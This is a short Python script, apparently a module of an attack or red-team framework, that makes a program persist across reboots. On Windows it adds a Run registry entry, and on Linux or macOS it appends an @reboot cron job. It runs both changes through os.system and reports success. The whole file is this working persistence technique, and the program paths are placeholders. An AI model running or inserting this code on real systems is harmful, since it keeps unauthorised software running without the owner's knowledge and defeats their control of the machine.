######################################################################################################################################################################## 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”).
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################

import os

def establish_persistence():
    if os.name == 'nt':
        # Windows persistence example: adding a startup entry
        command = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MyApp /t REG_SZ /d "C:\\Path\\To\\YourApp.exe" /f'
        os.system(command)
        return "Persistence established on Windows"

    elif os.name == 'posix':
        # Linux/MacOS persistence example: adding a cron job
        command = '(crontab -l ; echo "@reboot /path/to/your/script.sh") | crontab -'
        os.system(command)
        return "Persistence established on Linux/MacOS"

def execute(*args):
    return establish_persistence()

if __name__ == "__main__":
    print(establish_persistence())

